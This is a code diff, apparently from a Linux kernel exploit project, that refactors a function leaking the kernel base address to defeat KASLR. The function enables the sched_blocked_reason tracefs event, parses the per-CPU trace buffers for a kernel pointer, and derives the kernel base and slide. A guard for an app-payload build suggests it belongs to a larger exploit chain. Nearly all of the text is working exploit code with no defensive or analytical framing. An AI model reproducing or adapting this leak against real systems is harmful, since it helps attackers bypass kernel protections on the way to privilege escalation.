@@ -75,31 +75,29 @@ static int slide_tracefs_parse_page(
   return 0;
 }
 
-static int slide_tracefs_leak_kernel_base(void) {
-  static const char tracing_on[] =
-      SLIDE_TRACEFS_ROOT "/tracing_on";
-  static const char trace[] =
-      SLIDE_TRACEFS_ROOT "/trace";
-  static const char event_enable[] =
-      SLIDE_TRACEFS_ROOT "/events/sched/sched_blocked_reason/enable";
 
-  if (!slide_tracefs_write(tracing_on, "0") ||
-      !slide_tracefs_write(event_enable, "1") ||
-      !slide_tracefs_write(tracing_on, "1")) {
-    pr_error("slide tracefs setup failed errno=%d\n", errno);
+int slide_tracefs_try_leak(uintptr_t *offset_out) {
+  uintptr_t candidate = 0;
+  int found = 0;
+
+  if (!slide_tracefs_write(SLIDE_TRACEFS_ROOT "/tracing_on", "0") ||
+      !slide_tracefs_write(
+          SLIDE_TRACEFS_ROOT "/events/sched/sched_blocked_reason/enable",
+          "1") ||
+      !slide_tracefs_write(SLIDE_TRACEFS_ROOT "/tracing_on", "1")) {
+    pr_warning("slide tracefs unavailable (unprivileged domain?) errno=%d\n",
+               errno);
     return 0;
   }
 
-  int trace_fd = open(trace, O_WRONLY | O_TRUNC | O_CLOEXEC);
+  int trace_fd = open(SLIDE_TRACEFS_ROOT "/trace", O_WRONLY | O_TRUNC | O_CLOEXEC);
   if (trace_fd >= 0) {
     close(trace_fd);
   }
   sleep(1);
-  slide_tracefs_write(tracing_on, "0");
+  slide_tracefs_write(SLIDE_TRACEFS_ROOT "/tracing_on", "0");
 
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
-  uintptr_t candidate = 0;
-  int found = 0;
   for (int cpu = 0; cpu < cpu_count && !found; cpu++) {
     char path[128];
     snprintf(path, sizeof(path),
@@ -118,23 +116,19 @@ static int slide_tracefs_leak_kernel_base(void) {
     }
     close(fd);
   }
-  slide_tracefs_write(event_enable, "0");
+  slide_tracefs_write(
+      SLIDE_TRACEFS_ROOT "/events/sched/sched_blocked_reason/enable", "0");
   if (!found) {
-    pr_error("slide tracefs worker caller not found\n");
+    pr_warning("slide tracefs worker caller not found\n");
     return 0;
   }
-
-  slide_p0_offset = candidate;
-  kaslr_base = KIMAGE_TEXT_BASE + candidate;
-  kaslr_slide = candidate;
-  kaslr_done = 1;
-  pr_success("slide-kaslr-ok source=tracefs pid=%d base=%016llx "
-             "slide=%016llx p0_offset=%08zx\n",
-             getpid(), (unsigned long long)kaslr_base,
-             (unsigned long long)kaslr_slide, slide_p0_offset);
+  if (offset_out) {
+    *offset_out = candidate;
+  }
   return 1;
 }
 
+#if !defined(APP_PAYLOAD) || !APP_PAYLOAD
 int slide_leak_kernel_base(void) {
   const char *forced_offset_arg = getenv("SLIDE_P0_OFFSET");
   if (forced_offset_arg && *forced_offset_arg) {
@@ -156,5 +150,16 @@ int slide_leak_kernel_base(void) {
                (unsigned long long)kaslr_slide, slide_p0_offset);
     return 1;
   }
-  return slide_tracefs_leak_kernel_base();
+  if (!slide_tracefs_try_leak(&slide_p0_offset)) {
+    return 0;
+  }
+  kaslr_base = KIMAGE_TEXT_BASE + slide_p0_offset;
+  kaslr_slide = slide_p0_offset;
+  kaslr_done = 1;
+  pr_success("slide-kaslr-ok source=tracefs pid=%d base=%016llx "
+             "slide=%016llx p0_offset=%08zx\n",
+             getpid(), (unsigned long long)kaslr_base,
+             (unsigned long long)kaslr_slide, slide_p0_offset);
+  return 1;
 }
+#endif
